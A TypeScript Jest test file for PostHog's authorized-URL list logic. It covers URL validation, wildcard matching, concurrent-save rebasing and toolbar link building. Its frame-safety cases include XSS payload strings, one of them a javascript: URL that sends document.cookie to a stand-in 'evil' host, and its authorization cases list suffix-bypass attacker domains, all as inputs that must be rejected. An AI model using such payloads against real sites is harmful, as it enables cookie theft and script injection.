import { MOCK_DEFAULT_TEAM, MOCK_TEAM_ID, api } from 'lib/api.mock'

import { router } from 'kea-router'
import { expectLogic } from 'kea-test-utils'

import { SetupTaskId, globalSetupLogic } from 'lib/components/ProductSetup'
import { urls } from 'scenes/urls'

import { useMocks } from '~/mocks/jest'
import { initKeaTests } from '~/test/init'

import {
    AuthorizedUrlListType,
    NEW_URL,
    SuggestedDomain,
    appEditorUrl,
    authorizedUrlListLogic,
    checkUrlIsAuthorized,
    checkUrlIsSafeToFrame,
    directToolbarUrl,
    filterNotAuthorizedUrls,
    rebaseAuthorizedUrls,
    validateProposedUrl,
} from './authorizedUrlListLogic'

describe('the authorized urls list logic', () => {
    let logic: ReturnType<typeof authorizedUrlListLogic.build>

    beforeEach(() => {
        useMocks({
            get: {
                '/api/environments/:team_id/insights/trend/': ({ request }) => {
                    if (JSON.parse(new URL(request.url).searchParams.get('events') || '[]')?.[0]?.throw) {
                        return [500, { status: 0, detail: 'error from the API' }]
                    }
                    return [200, { result: ['result from api'] }]
                },
            },
            patch: {
                '/api/projects/:team': [200, {}],
            },
        })
        initKeaTests()
        logic = authorizedUrlListLogic({
            type: AuthorizedUrlListType.TOOLBAR_URLS,
            actionId: null,
            experimentId: null,
            productTourId: null,
            query: null,
        })
        logic.mount()
    })

    // `clearMocks` only clears calls, so a spy with a mock implementation would otherwise leak
    // into every later test in this file.
    afterEach(() => {
        jest.restoreAllMocks()
    })

    it('encodes an app url correctly', () => {
        expect(appEditorUrl('http://127.0.0.1:8000')).toEqual(
            '/api/user/redirect_to_site/?userIntent=add-action&uiHost=http%3A%2F%2Flocalhost&appUrl=http%3A%2F%2F127.0.0.1%3A8000'
        )
    })

    it('can be launched with adding a new URL focussed', async () => {
        router.actions.push(`${urls.toolbarLaunch()}?addNew=true`)
        await expectLogic(logic).toDispatchActions(['newUrl'])
    })

    it('can be launchd without focussing adding new URL', async () => {
        router.actions.push(urls.toolbarLaunch())
        await expectLogic(logic).toNotHaveDispatchedActions(['newUrl'])
    })

    describe('applying a suggestion', () => {
        // Regression coverage: the `addUrl` listener must await `saveUrls` before triggering
        // `markTaskAsCompleted`. Both send PATCHes to /api/projects/:id, and the `currentTeam`
        // subscription in this logic replaces local `authorizedUrls` from whichever response lands
        // last. If the onboarding-tasks PATCH fires in parallel with the app_urls PATCH, its
        // response can carry a stale app_urls snapshot and wipe the just-added URL out of the UI.
        it('only marks the setup task as completed after saveUrls resolves', async () => {
            const markTaskAsCompleted = jest.fn()
            jest.spyOn(globalSetupLogic, 'findMounted').mockReturnValue({
                actions: { markTaskAsCompleted },
            } as any)

            let resolveUpdate: (value: any) => void = () => {}
            jest.spyOn(api, 'update').mockImplementation(
                () =>
                    new Promise((resolve) => {
                        resolveUpdate = resolve
                    })
            )

            const flushPromises = (): Promise<void> => new Promise((resolve) => setTimeout(resolve, 0))

            logic.actions.addUrl('https://new-suggestion.example.com')

            await flushPromises()

            expect(api.update).toHaveBeenCalledWith(
                `api/projects/${MOCK_TEAM_ID}`,
                expect.objectContaining({
                    app_urls: expect.arrayContaining(['https://new-suggestion.example.com']),
                })
            )
            // saveUrls is still pending, so the onboarding task PATCH must not have fired yet
            expect(markTaskAsCompleted).not.toHaveBeenCalled()

            resolveUpdate({ app_urls: ['https://new-suggestion.example.com'] })
            await expectLogic(logic).toFinishAllListeners()

            expect(markTaskAsCompleted).toHaveBeenCalledWith(SetupTaskId.AddAuthorizedDomain)
        })
    })

    describe('saving against a list that moved', () => {
        // The team PATCH replaces the whole array, so a save built only from this tab's state
        // deletes anything a second editor added since the page loaded.
        const OTHER_EDITORS_URL = 'https://added-by-someone-else.example.com'

        it.each([
            [
                'removing',
                (): void => logic.actions.removeUrl(2),
                ['https://posthog.com/', 'https://app.posthog.com', 'http://127.0.0.1:*', OTHER_EDITORS_URL],
            ],
            [
                'adding',
                (): void => logic.actions.addUrl('https://brand-new.example.com'),
                [...MOCK_DEFAULT_TEAM.app_urls, OTHER_EDITORS_URL, 'https://brand-new.example.com'],
            ],
            [
                'editing',
                (): void => logic.actions.updateUrl(2, 'https://renamed.example.com'),
                [
                    'https://posthog.com/',
                    'https://app.posthog.com',
                    'https://renamed.example.com',
                    'http://127.0.0.1:*',
                    OTHER_EDITORS_URL,
                ],
            ],
        ])("keeps the other editor's URL when %s", async (_name, act, expectedAppUrls) => {
            useMocks({
                get: {
                    '/api/environments/@current/': {
                        ...MOCK_DEFAULT_TEAM,
                        app_urls: [...MOCK_DEFAULT_TEAM.app_urls, OTHER_EDITORS_URL],
                    },
                },
            })
            jest.spyOn(api, 'update')

            await expectLogic(logic, act).toFinishAllListeners()

            expect(api.update).toHaveBeenCalledWith(`api/environments/${MOCK_TEAM_ID}`, {
                app_urls: expectedAppUrls,
            })
        })

        it('lands both edits when two saves are dispatched back to back', async () => {
            let storedUrls = [...MOCK_DEFAULT_TEAM.app_urls]
            useMocks({
                get: { '/api/environments/@current/': () => [200, { ...MOCK_DEFAULT_TEAM, app_urls: storedUrls }] },
                patch: {
                    '/api/environments/:team_id/': async ({ request }) => {
                        storedUrls = ((await request.json()) as { app_urls: string[] }).app_urls
                        return [200, { ...MOCK_DEFAULT_TEAM, app_urls: storedUrls }]
                    },
                },
            })

            await expectLogic(logic, () => {
                logic.actions.addUrl('https://one.example.com')
                logic.actions.addUrl('https://two.example.com')
            }).toFinishAllListeners()

            const expected = [...MOCK_DEFAULT_TEAM.app_urls, 'https://one.example.com', 'https://two.example.com']
            expect(storedUrls).toEqual(expected)
            expect(logic.values.authorizedUrls).toEqual(expected)
        })

        it('does not save at all when the current list cannot be read', async () => {
            useMocks({ get: { '/api/environments/@current/': () => [500, { detail: 'nope' }] } })
            jest.spyOn(api, 'update')

            await expectLogic(logic, () => logic.actions.removeUrl(2)).toFinishAllListeners()

            expect(api.update).not.toHaveBeenCalled()
            expect(logic.values.authorizedUrls).toEqual(MOCK_DEFAULT_TEAM.app_urls)
        })
    })

    describe('a save the server rejects', () => {
        beforeEach(() => {
            useMocks({ patch: { '/api/environments/:team_id/': () => [400, { detail: 'app_urls is invalid' }] } })
        })

        it('puts the removed URL back instead of leaving the list looking saved', async () => {
            await expectLogic(logic, () => logic.actions.removeUrl(2)).toFinishAllListeners()

            expect(logic.values.authorizedUrls).toEqual(MOCK_DEFAULT_TEAM.app_urls)
        })

        it('does not mark the setup task as completed', async () => {
            const markTaskAsCompleted = jest.fn()
            jest.spyOn(globalSetupLogic, 'findMounted').mockReturnValue({
                actions: { markTaskAsCompleted },
            } as any)

            await expectLogic(logic, () => logic.actions.addUrl('https://rejected.example.com')).toFinishAllListeners()

            expect(markTaskAsCompleted).not.toHaveBeenCalled()
            expect(logic.values.authorizedUrls).toEqual(MOCK_DEFAULT_TEAM.app_urls)
        })
    })

    describe('rebaseAuthorizedUrls', () => {
        it.each([
            ['an addition goes on the end', ['a'], ['a'], ['a', 'b'], ['a', 'b']],
            ['a removal drops only that entry', ['a', 'b'], ['a', 'b'], ['a'], ['a']],
            ['an edit keeps the position', ['a', 'b', 'c'], ['a', 'b', 'c'], ['a', 'x', 'c'], ['a', 'x', 'c']],
            ['an entry added elsewhere survives', ['a', 'b', 'z'], ['a', 'b'], ['a'], ['a', 'z']],
            ['an entry removed elsewhere stays removed', ['a'], ['a', 'b'], ['a', 'b', 'c'], ['a', 'c']],
            ['an edit whose entry is gone is re-added', ['a'], ['a', 'b'], ['a', 'x'], ['a', 'x']],
            ['a duplicate is not created', ['a', 'b'], ['a'], ['a', 'b'], ['a', 'b']],
        ])('%s', (_name, serverUrls, knownUrls, intendedUrls, expected) => {
            expect(rebaseAuthorizedUrls(serverUrls, knownUrls, intendedUrls)).toEqual(expected)
        })
    })

    describe('the proposed URL form', () => {
        it('shows errors when the value is invalid', async () => {
            await expectLogic(logic, () => {
                logic.actions.setProposedUrlValue('url', 'not a domain or url')
            }).toMatchValues({
                proposedUrl: { url: 'not a domain or url' },
                proposedUrlChanged: true,
                proposedUrlHasErrors: true,
                proposedUrlValidationErrors: { url: 'Please enter a valid URL' },
            })
        })

        // The form opens prefilled with `https://`, so a pasted full URL doubles the protocol
        test.each([
            ['https://www.example.com', 'https://www.example.com'],
            ['http://localhost:3000', 'http://localhost:3000'],
        ])('keeps a single protocol when "%s" is pasted over the prefilled one', async (pasted, expected) => {
            await expectLogic(logic, () => {
                logic.actions.newUrl()
                logic.actions.setProposedUrlValue('url', `${NEW_URL}${pasted}`)
            }).toFinishAllListeners()

            await expectLogic(logic).toMatchValues({
                proposedUrl: { url: expected },
                proposedUrlHasErrors: false,
            })
        })

        it('repairs a saved URL that already has two protocols when it is edited', async () => {
            // An earlier test leaves `api.update` mocked with a promise it never resolves
            const update = jest.spyOn(api, 'update').mockResolvedValue({})

            await expectLogic(logic, () => {
                logic.actions.setAuthorizedUrls(['https://https://www.example.com'])
                logic.actions.setEditUrlIndex(0)
            }).toFinishAllListeners()

            await expectLogic(logic, () => {
                logic.actions.submitProposedUrl()
            }).toFinishAllListeners()

            expect(update).toHaveBeenCalledWith(`api/projects/${MOCK_TEAM_ID}`, {
                app_urls: ['https://www.example.com'],
            })
        })

        it('allows an unchanged URL when editing', async () => {
            await expectLogic(logic, () => {
                logic.actions.setAuthorizedUrls(['https://example.com'])
                logic.actions.setEditUrlIndex(0)
            }).toMatchValues({
                proposedUrl: { url: 'https://example.com' },
                proposedUrlHasErrors: false,
            })
        })
    })

    describe('loading suggestions', () => {
        // Regression coverage: suggestions are advisory, so a failed query must leave the list empty
        // and succeed the loader rather than escape as an unhandled kea-loaders error into error tracking.
        it('returns no suggestions when the query fails', async () => {
            useMocks({
                post: {
                    '/api/environments/:team_id/query/:kind': [
                        500,
                        { type: 'server_error', detail: 'error from the API' },
                    ],
                },
            })

            await expectLogic(logic, () => {
                logic.actions.loadSuggestions()
            })
                .toDispatchActions(['loadSuggestions', 'loadSuggestionsSuccess'])
                .toNotHaveDispatchedActions(['loadSuggestionsFailure'])
                .toMatchValues({ suggestions: [] })
        })
    })

    describe('checkUrlIsAuthorized', () => {
        const testCases: { url: string; authorized: string[]; expected: boolean }[] = [
            // Legitimate matches
            { url: 'https://example.com', authorized: ['https://example.com'], expected: true },
            { url: 'https://example.com/some/path?q=1', authorized: ['https://example.com'], expected: true },
            { url: 'https://example.com', authorized: ['https://example.com/already/has/a/path'], expected: true },
            // www-equivalence both directions
            { url: 'https://example.com', authorized: ['https://www.example.com'], expected: true },
            { url: 'https://www.example.com', authorized: ['https://example.com'], expected: true },
            // Protocol must match: an http origin must not match an https-only authorized entry
            { url: 'http://example.com', authorized: ['https://example.com'], expected: false },
            { url: 'http://www.example.com', authorized: ['https://example.com'], expected: false },
            // wildcard subdomains and ports
            { url: 'https://app.example.com', authorized: ['https://*.example.com'], expected: true },
            { url: 'https://a.b.example.com', authorized: ['https://*.example.com'], expected: true },
            { url: 'http://localhost:3000', authorized: ['http://localhost:*'], expected: true },
            // Suffix bypass: an attacker domain that merely ends with the authorized origin string
            { url: 'https://example.com.evil.com', authorized: ['https://example.com'], expected: false },
            { url: 'https://app.example.com.evil.com', authorized: ['https://*.example.com'], expected: false },
            // Prefix/substring bypass: a different registrable domain that is a substring of the entry
            { url: 'https://example.co', authorized: ['https://example.com'], expected: false },
            // Plain unrelated origin
            { url: 'https://evil.com', authorized: ['https://example.com'], expected: false },
            { url: 'https://example.org', authorized: ['https://example.com'], expected: false },
            // Nothing authorized
            { url: 'https://example.com', authorized: [], expected: false },
        ]

        testCases.forEach(({ url, authorized, expected }) => {
            it(`"${url}" against [${authorized.join(', ')}] is ${expected ? 'authorized' : 'not authorized'}`, () => {
                expect(checkUrlIsAuthorized(url, authorized)).toBe(expected)
            })
        })
    })

    describe('validating proposed URLs', () => {
        const testCases = [
            { proposedUrl: 'https://valid.*.example.com', validityMessage: undefined },
            {
                proposedUrl: 'https://notsovalid.*.*',
                validityMessage: 'Wildcards can only be used for subdomains',
            },
            {
                proposedUrl: 'https://*.*.*',
                validityMessage: 'Wildcards can only be used for subdomains',
            },
            { proposedUrl: 'https://valid*.example.com', validityMessage: undefined },
            { proposedUrl: 'https://*.valid.com', validityMessage: undefined },
            {
                proposedUrl: 'https://not.*.valid.*',
                validityMessage: 'Wildcards can only be used for subdomains',
            },
            {
                proposedUrl: 'http://localhost:*',
                validityMessage: 'Wildcards are not allowed in the port position',
            },
            {
                proposedUrl: 'http://valid.example.com:*',
                validityMessage: 'Wildcards are not allowed in the port position',
            },
            {
                proposedUrl: 'http://*.localhost:3000',
                validityMessage: undefined,
            },
            {
                proposedUrl: 'http://*.valid.com:3000',
                validityMessage: undefined,
            },
        ]

        testCases.forEach((testCase) => {
            it(`a proposal of "${testCase.proposedUrl}" has validity message "${testCase.validityMessage}"`, () => {
                expect(validateProposedUrl(testCase.proposedUrl, [], false)).toEqual(testCase.validityMessage)
            })
        })

        it('can refuse wildcards', () => {
            expect(validateProposedUrl('https://*.example.com', [], false, false)).toEqual('Wildcards are not allowed')
            expect(validateProposedUrl('https://*.example.com', [], false, true)).toEqual(undefined)
            expect(validateProposedUrl('https://*.example.com', [], false)).toEqual(undefined)
        })

        it('fails if the proposed URL is already authorized', () => {
            expect(validateProposedUrl('https://valid.*.example.com', ['https://valid.*.example.com'], false)).toBe(
                'This URL already is registered'
            )
            expect(
                validateProposedUrl(
                    'https://valid.and-not-already-authorized.example.com',
                    ['https://valid.*.example.com'],
                    false
                )
            ).toBe(undefined)
        })
    })
    describe('recording domain type', () => {
        beforeEach(() => {
            logic = authorizedUrlListLogic({
                type: AuthorizedUrlListType.RECORDING_DOMAINS,
                actionId: null,
                experimentId: null,
                productTourId: null,
                query: null,
            })
            logic.mount()
        })
        it('gets initial domains from recording_domains on the current team', () => {
            expectLogic(logic).toMatchValues({
                authorizedUrls: ['https://recordings.posthog.com/'],
            })
        })
        it('addUrl the recording_domains on the team', async () => {
            jest.spyOn(api, 'update')

            await expectLogic(logic, () => logic.actions.addUrl('http://*.example.com')).toFinishAllListeners()

            expect(api.update).toHaveBeenCalledWith(`api/projects/${MOCK_TEAM_ID}`, {
                recording_domains: ['https://recordings.posthog.com/', 'http://*.example.com'],
            })
        })

        describe('validating proposed recording domains', () => {
            const testCases = [
                { proposedUrl: 'https://valid.*.example.com', validityMessage: undefined },
                {
                    proposedUrl: 'https://not.valid.com/path',
                    validityMessage: "Please enter a valid domain (URLs with a path aren't allowed)",
                },
                {
                    proposedUrl: 'https://not.*.valid.*',
                    validityMessage: 'Wildcards can only be used for subdomains',
                },
                {
                    proposedUrl: 'capacitor://localhost',
                    validityMessage: undefined,
                },
                {
                    proposedUrl: 'https://https://www.example.com',
                    validityMessage: "Please enter a valid domain (URLs with a path aren't allowed)",
                },
            ]

            testCases.forEach((testCase) => {
                it(`a proposal of "${testCase.proposedUrl}" has validity message "${testCase.validityMessage}"`, () => {
                    expect(validateProposedUrl(testCase.proposedUrl, [], true)).toEqual(testCase.validityMessage)
                })
            })
        })
    })

    describe('directToolbarUrl', () => {
        const parseHash = (url: string): Record<string, unknown> => {
            const hash = url.split('#__posthog=')[1]
            return JSON.parse(decodeURIComponent(hash))
        }

        it('always includes uiHost from window.location.origin', () => {
            // JSDOM sets window.location.origin to 'http://localhost'
            const params = parseHash(directToolbarUrl('https://example.com'))
            expect(params.uiHost).toBe('http://localhost')
        })

        it('does not include apiURL', () => {
            const params = parseHash(directToolbarUrl('https://example.com'))
            expect(params.apiURL).toBeUndefined()
        })

        it('sets required action fields', () => {
            const params = parseHash(directToolbarUrl('https://example.com', { token: 'phc_abc' }))
            expect(params.action).toBe('ph_authorize')
            expect(params.toolbarVersion).toBe('toolbar')
            expect(params.instrument).toBe(true)
            expect(params.token).toBe('phc_abc')
        })

        it('includes user identity fields', () => {
            const params = parseHash(
                directToolbarUrl('https://example.com', {
                    userEmail: 'user@example.com',
                    distinctId: 'distinct_123',
                })
            )
            expect(params.userEmail).toBe('user@example.com')
            expect(params.distinctId).toBe('distinct_123')
        })

        it('sets userIntent to add-action when no specific intent', () => {
            const params = parseHash(directToolbarUrl('https://example.com'))
            expect(params.userIntent).toBe('add-action')
        })

        it('sets userIntent to edit-action when actionId is provided', () => {
            const params = parseHash(directToolbarUrl('https://example.com', { actionId: 42 }))
            expect(params.userIntent).toBe('edit-action')
            expect(params.actionId).toBe(42)
        })

        it('sets userIntent to edit-experiment when experimentId is provided', () => {
            const params = parseHash(directToolbarUrl('https://example.com', { experimentId: 99 }))
            expect(params.userIntent).toBe('edit-experiment')
            expect(params.experimentId).toBe(99)
        })

        it('sets userIntent to edit-product-tour when productTourId is provided', () => {
            const params = parseHash(directToolbarUrl('https://example.com', { productTourId: 'tour_1' }))
            expect(params.userIntent).toBe('edit-product-tour')
            expect(params.productTourId).toBe('tour_1')
        })

        it('sets userIntent to add-product-tour when productTourId is "new"', () => {
            const params = parseHash(directToolbarUrl('https://example.com', { productTourId: 'new' }))
            expect(params.userIntent).toBe('add-product-tour')
            expect(params.productTourId).toBeUndefined()
        })

        it('includes dataAttributes when provided', () => {
            const params = parseHash(
                directToolbarUrl('https://example.com', { dataAttributes: ['data-id', 'data-attr'] })
            )
            expect(params.dataAttributes).toEqual(['data-id', 'data-attr'])
        })

        it('puts params in the hash fragment of appUrl', () => {
            const url = directToolbarUrl('https://mysite.com/page?q=1')
            expect(url.startsWith('https://mysite.com/page?q=1#__posthog=')).toBe(true)
        })

        it('uiHost is window.location.origin regardless of apiURL option', () => {
            // Simulates reverse proxy customer: their api_host is their proxy,
            // but uiHost should always be window.location.origin (the PostHog app)
            const params = parseHash(directToolbarUrl('https://customer.com'))
            expect(params.uiHost).toBe('http://localhost')
            expect(params.apiURL).toBeUndefined()
        })

        it('does not include toolbarFlagsKey when not provided', () => {
            const params = parseHash(directToolbarUrl('https://example.com'))
            expect(params.toolbarFlagsKey).toBeUndefined()
        })

        it('includes toolbarFlagsKey when provided', () => {
            const params = parseHash(directToolbarUrl('https://example.com', { toolbarFlagsKey: 'flags_key_xyz' }))
            expect(params.toolbarFlagsKey).toBe('flags_key_xyz')
        })
    })

    describe('checkUrlIsSafeToFrame', () => {
        const authorizedUrls = ['https://example.com', 'https://*.allowed.com', 'http://localhost:*']

        const testCases: { url: string; safe: boolean }[] = [
            // Authorized http(s) URLs are safe to frame
            { url: 'https://example.com', safe: true },
            { url: 'https://example.com/some/path', safe: true },
            { url: 'https://app.allowed.com', safe: true },
            { url: 'http://localhost:3000', safe: true },
            // Authorized host but a dangerous scheme must still be rejected
            { url: 'javascript:alert(document.domain)', safe: false },
            { url: 'javascript:fetch("//evil?"+document.cookie)//', safe: false },
            { url: 'data:text/html,<script>alert(1)</script>', safe: false },
            { url: 'blob:https://example.com/uuid', safe: false },
            { url: 'vbscript:msgbox(1)', safe: false },
            { url: 'JavaScript:alert(1)', safe: false },
            { url: ' javascript:alert(1)', safe: false },
            // Valid scheme but origin is not authorized
            { url: 'https://evil.example.net', safe: false },
            { url: 'https://example.org', safe: false },
            // Degenerate inputs fail closed
            { url: '', safe: false },
            { url: 'not-a-url', safe: false },
        ]

        it.each(testCases)('treats "$url" as safe=$safe to frame', ({ url, safe }) => {
            expect(checkUrlIsSafeToFrame(url, authorizedUrls)).toBe(safe)
        })

        it('is unsafe when no URLs are authorized', () => {
            expect(checkUrlIsSafeToFrame('https://example.com', [])).toBe(false)
        })
    })

    describe('filterNotAuthorizedUrls', () => {
        const testUrls: SuggestedDomain[] = [
            { url: 'https://1.wildcard.com', count: 1 },
            { url: 'https://2.wildcard.com', count: 1 },
            { url: 'https://a.single.io', count: 1 },
            { url: 'https://a.sub.b.multi-wildcard.com', count: 1 },
            { url: 'https://a.not.b.multi-wildcard.com', count: 1 },
            { url: 'https://not.valid.io', count: 1 },
        ]

        it('suggests all if empty', () => {
            expect(filterNotAuthorizedUrls(testUrls, [])).toEqual(testUrls)
        })

        it('allows specific domains', () => {
            expect(filterNotAuthorizedUrls(testUrls, ['https://a.single.io'])).toEqual([
                { url: 'https://1.wildcard.com', count: 1 },
                { url: 'https://2.wildcard.com', count: 1 },
                { url: 'https://a.sub.b.multi-wildcard.com', count: 1 },
                { url: 'https://a.not.b.multi-wildcard.com', count: 1 },
                { url: 'https://not.valid.io', count: 1 },
            ])
        })

        it('filters wildcard domains', () => {
            expect(
                filterNotAuthorizedUrls(testUrls, ['https://*.wildcard.com', 'https://*.sub.*.multi-wildcard.com'])
            ).toEqual([
                { url: 'https://a.single.io', count: 1 },
                { url: 'https://a.not.b.multi-wildcard.com', count: 1 },
                { url: 'https://not.valid.io', count: 1 },
            ])
        })

        it('filters out invalid URLs like paths without domains', () => {
            const urlsWithInvalidPaths: SuggestedDomain[] = [
                { url: '/', count: 10 },
                { url: '/billing', count: 5 },
                { url: '/settings/project', count: 3 },
                { url: 'https://valid.example.com', count: 2 },
                { url: 'not-a-url', count: 1 },
            ]
            expect(filterNotAuthorizedUrls(urlsWithInvalidPaths, [])).toEqual([
                { url: 'https://valid.example.com', count: 2 },
            ])
        })
    })
})
